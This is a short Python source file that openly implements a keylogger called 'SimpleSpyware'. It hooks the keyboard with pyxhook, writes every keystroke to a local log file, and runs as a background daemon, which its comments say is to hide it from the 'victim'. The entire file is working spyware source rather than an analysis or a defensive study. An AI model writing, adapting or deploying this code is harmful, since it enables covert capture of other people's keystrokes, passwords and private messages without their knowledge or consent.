#!/usr/bin/env python3

""" Implementation of simple keylogger in Python.
"""

import daemon
import logging
import pyxhook


class Keylogger:
    """ This class represents the code injecting malware. """

    def __init__(self, name):
        self._name = name

    @property
    def name(self):
        """ Name of the malware. """
        return self._name

    @name.setter
    def name(self, new_name):
        self._name = new_name

    def start_logging(self):
        """ Log every keystroke of the user into log file. """
        # Crete hook manager.
        hook_manager = pyxhook.HookManager()
        # Assign callback for handling key strokes.
        hook_manager.KeyDown = self._keydown_callback
        # Hook the keyboard and start logging.
        hook_manager.HookKeyboard()
        hook_manager.start()

    def _keydown_callback(self, key):
        """ This function is handler of key stroke event. """
        logging.debug(chr(key.Ascii))


if __name__ == '__main__':
    # Setup logger.
    logging.basicConfig(
        level=logging.DEBUG,
        filename='activity.log',
        format='Key: %(message)s',
    )
    # Get file handler. We need to pass it to our daemon.
    handler = logging.getLogger().handlers[0].stream

    # Daemonize the process to hide it from the victim.
    with daemon.DaemonContext(files_preserve=[handler]):
        # Create keylogger.
        keylogger = Keylogger('SimpleSpyware')
        # Start logging activity of the user.
        keylogger.start_logging()
